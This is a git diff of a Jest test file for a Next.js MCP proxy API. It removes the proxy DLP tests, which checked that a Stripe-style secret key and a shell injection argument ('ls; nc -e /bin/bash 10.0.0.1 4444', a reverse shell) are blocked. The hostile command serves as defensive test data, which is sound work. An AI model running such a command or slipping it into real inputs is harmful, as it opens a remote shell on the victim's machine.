@@ -19,7 +19,6 @@ const mockEq        = jest.fn();
 const mockSelect    = jest.fn();
 const mockInsert    = jest.fn();
 const mockResolveApiKey = jest.fn();
-const mockExecuteProxyCall = jest.fn();
 
 // Chainable query builder mock
 const queryChain = () => {
@@ -77,12 +76,7 @@ jest.mock('@/lib/ratelimit', () => ({
 }));
 
 jest.mock('@/lib/runtime-contracts', () => ({
-  ensureRuntimeContracts: jest.fn().mockResolvedValue(undefined),
   ensureSearchContracts: jest.fn().mockResolvedValue(undefined),
-}));
-
-jest.mock('@/lib/proxy-execute', () => ({
-  executeProxyCall: (...args: any[]) => mockExecuteProxyCall(...args),
 }));
 
 import { NextRequest, type NextRequest as NR } from 'next/server';
@@ -115,7 +109,6 @@ async function toJson(response: Response) {
 beforeEach(() => {
   mockResolveApiKey.mockResolvedValue({ userId: null, keyId: null });
   mockRpc.mockResolvedValue({ data: 'allowed', error: null });
-  mockExecuteProxyCall.mockReset();
 });
 
 // ── Security scanner — unit regression ───────────────────────────────────────
@@ -433,117 +426,6 @@ describe('MCP manifest wiring', () => {
     expect(payload.manifest.run_mode).toBe('local_stdio');
     expect(payload.manifest.launch.command).toEqual(['npx', '-y', '@demo/server']);
     expect(payload.tools[0].name).toBe('send_email');
-  });
-});
-
-// ── DLP proxy layer ───────────────────────────────────────────────────────────
-describe('Proxy DLP blocking', () => {
-  test('proxy blocks Stripe key in request arguments', async () => {
-    mockGetUser.mockResolvedValue({ data: { user: null } });
-    mockResolveApiKey.mockResolvedValue({ userId: 'user-123', keyId: 'key-123' });
-    mockFrom.mockImplementation((table: string) => {
-      if (table === 'audit_log') {
-        return { insert: jest.fn(() => ({ catch: jest.fn() })) };
-      }
-      return {
-        select: jest.fn().mockReturnValue({
-          eq: jest.fn().mockReturnValue({
-            eq: jest.fn().mockReturnValue({
-              single: jest.fn().mockResolvedValue({
-                data: {
-                  id: 'srv-1', name: 'stripe', endpoint: 'https://stripe-mcp.example.com',
-                  tools: ['charge'], trust_score: 90, latency_ms: 50, auth_type: 'api_key',
-                },
-                error: null,
-              }),
-            }),
-          }),
-        }),
-      };
-    });
-
-    const { POST } = await import('../app/api/proxy/[serverName]/[toolName]/route');
-    const req = makeRequest(
-      'POST',
-      'http://localhost/api/proxy/stripe/charge',
-      { api_key: 'sk_live_abcdefghijklmnopqrstuvwxyz0123', amount: 4900 },
-      { Authorization: 'Bearer sk_mcp_test' }
-    );
-
-    const res = await POST(req, { params: Promise.resolve({ serverName: 'stripe', toolName: 'charge' }) });
-    const body = await toJson(res);
-    expect(res.status).toBe(400);
-    expect(body.error).toMatch(/credential|blocked/i);
-  });
-
-  test('proxy blocks shell injection in arguments', async () => {
-    mockGetUser.mockResolvedValue({ data: { user: null } });
-    mockResolveApiKey.mockResolvedValue({ userId: 'user-123', keyId: 'key-123' });
-    mockFrom.mockImplementation((table: string) => {
-      if (table === 'audit_log') {
-        return { insert: jest.fn(() => ({ catch: jest.fn() })) };
-      }
-      return {
-        select: jest.fn().mockReturnValue({
-          eq: jest.fn().mockReturnValue({
-            eq: jest.fn().mockReturnValue({
-              single: jest.fn().mockResolvedValue({
-                data: {
-                  id: 'srv-2', name: 'shell-test', endpoint: 'https://test.example.com',
-                  tools: ['run'], trust_score: 80, latency_ms: 50, auth_type: 'none',
-                },
-                error: null,
-              }),
-            }),
-          }),
-        }),
-      };
-    });
-
-    const { POST } = await import('../app/api/proxy/[serverName]/[toolName]/route');
-    const req = makeRequest(
-      'POST',
-      'http://localhost/api/proxy/shell-test/run',
-      { command: 'ls; nc -e /bin/bash 10.0.0.1 4444' },
-      { Authorization: 'Bearer sk_mcp_test' }
-    );
-
-    const res = await POST(req, { params: Promise.resolve({ serverName: 'shell-test', toolName: 'run' }) });
-    const body = await toJson(res);
-    expect(res.status).toBe(400);
-    expect(body.error).toMatch(/injection|blocked/i);
-  });
-
-  test('proxy returns 404 for unknown server', async () => {
-    mockGetUser.mockResolvedValue({ data: { user: null } });
-    mockResolveApiKey.mockResolvedValue({ userId: 'user-123', keyId: 'key-123' });
-    mockFrom.mockReturnValue({
-      select: jest.fn().mockReturnValue({
-        eq: jest.fn().mockReturnValue({
-          eq: jest.fn().mockReturnValue({
-            single: jest.fn().mockResolvedValue({ data: null, error: { message: 'Not found' } }),
-          }),
-        }),
-      }),
-    });
-
-    const { POST } = await import('../app/api/proxy/[serverName]/[toolName]/route');
-    const req = makeRequest(
-      'POST',
-      'http://localhost/api/proxy/nonexistent/tool',
-      {},
-      { Authorization: 'Bearer sk_mcp_test' }
-    );
-    // Configure mock to return a proper 404 result — the server lookup happens
-    // inside executeProxyCall (which is mocked), so we must provide the result.
-    mockExecuteProxyCall.mockResolvedValue({
-      status: 404,
-      body: JSON.stringify({ error: "Server 'nonexistent' not found" }),
-      contentType: 'application/json',
-      headers: {},
-    });
-    const res = await POST(req, { params: Promise.resolve({ serverName: 'nonexistent', toolName: 'tool' }) });
-    expect(res.status).toBe(404);
   });
 });
 
